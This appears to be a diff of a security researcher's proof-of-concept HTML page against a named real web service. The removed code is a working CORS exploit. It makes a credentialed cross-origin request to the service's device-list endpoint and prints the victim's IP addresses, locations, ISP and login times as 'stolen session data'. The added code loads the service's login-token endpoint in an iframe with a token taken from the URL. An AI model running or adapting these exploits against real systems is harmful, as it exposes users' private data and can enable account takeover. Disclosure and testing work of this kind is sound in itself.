@@ -2,70 +2,34 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>CORS PoC — monica.im</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Testing PoC</title>
   <style>
-    body { font-family: monospace; background: #111; color: #0f0; padding: 2rem; }
-    h2 { color: #ff4444; }
-    pre { background: #1a1a1a; padding: 1rem; border: 1px solid #333; white-space: pre-wrap; word-break: break-all; }
-    .status { margin: 1rem 0; font-size: 1.2rem; }
-    .ok { color: #00ff00; }
-    .err { color: #ff4444; }
+    body { font-family: ui-monospace, monospace; background: #111; color: #0f0; padding: 1.5rem; max-width: 720px; margin: 0 auto; }
+    h1 { font-size: 1.1rem; font-weight: normal; color: #888; margin: 0 0 1rem; }
+    iframe { display: block; width: 100%; height: 100px; border: 1px solid #333; background: #0a0a0a; }
+    .status { margin: 0.5rem 0; font-size: 0.9rem; }
+    .ok { color: #0f0; }
+    .err { color: #f44; }
   </style>
 </head>
 <body>
-  <h2>CORS Misconfiguration PoC — api.monica.im</h2>
-  <p>Target: <code>POST https://api.monica.im/api/user/list_active_devices</code></p>
-  <p>Attacker origin: <code id="origin"></code></p>
-  <div class="status" id="status">Sending cross-origin authenticated request...</div>
-  <pre id="output">Waiting...</pre>
+  <h1>Testing PoC</h1>
+  <iframe id="f" title="poc"></iframe>
+  <div class="status" id="s">…</div>
 
   <script>
-    document.getElementById('origin').textContent = window.location.origin;
-
-    fetch('https://api.monica.im/api/user/list_active_devices', {
-      method: 'POST',
-      credentials: 'include',
-      headers: {
-        'Content-Type': 'application/json',
-        'X-Client-Type': 'web',
-        'X-Product-Name': 'Monica',
-        'X-Client-Locale': 'en'
-      },
-      body: JSON.stringify({})
-    })
-    .then(r => r.json())
-    .then(data => {
-      if (!data.data || data.data.length === 0) {
-        document.getElementById('status').innerHTML =
-          '<span class="err">No session / not logged in to Monica</span>';
-        document.getElementById('output').textContent = JSON.stringify(data, null, 2);
-        return;
-      }
-
-      document.getElementById('status').innerHTML =
-        '<span class="ok">✅ CORS BYPASS SUCCESSFUL — victim session data read cross-origin</span>';
-
-      const stolen = data.data.map(d => ({
-        ip: d.client_ip,
-        city: d.geo_info?.city,
-        country: d.geo_info?.country,
-        isp: d.geo_info?.isp,
-        browser: d.browser_name,
-        os: d.os_name,
-        login_at: new Date(d.login_at * 1000).toISOString()
-      }));
-
-      document.getElementById('output').textContent =
-        '=== STOLEN SESSION DATA ===\n\n' +
-        JSON.stringify(stolen, null, 2) +
-        '\n\n=== FULL RESPONSE ===\n\n' +
-        JSON.stringify(data, null, 2);
-    })
-    .catch(err => {
-      document.getElementById('status').innerHTML =
-        '<span class="err">❌ Blocked by browser CORS policy: ' + err.message + '</span>';
-      document.getElementById('output').textContent = err.toString();
-    });
+    (function () {
+      var p = new URLSearchParams(location.search);
+      var t = p.get('iframe_token');
+      if (t === null || t === '') t = 'DEMO_NO_SECRET';
+      var u = 'https://api.monica.im/api/user/login_token?token=' + encodeURIComponent(t);
+      var frame = document.getElementById('f');
+      var st = document.getElementById('s');
+      frame.addEventListener('load', function () { st.innerHTML = '<span class="ok">load</span>'; });
+      frame.addEventListener('error', function () { st.innerHTML = '<span class="err">error</span>'; });
+      frame.src = u;
+    })();
   </script>
 </body>
 </html>
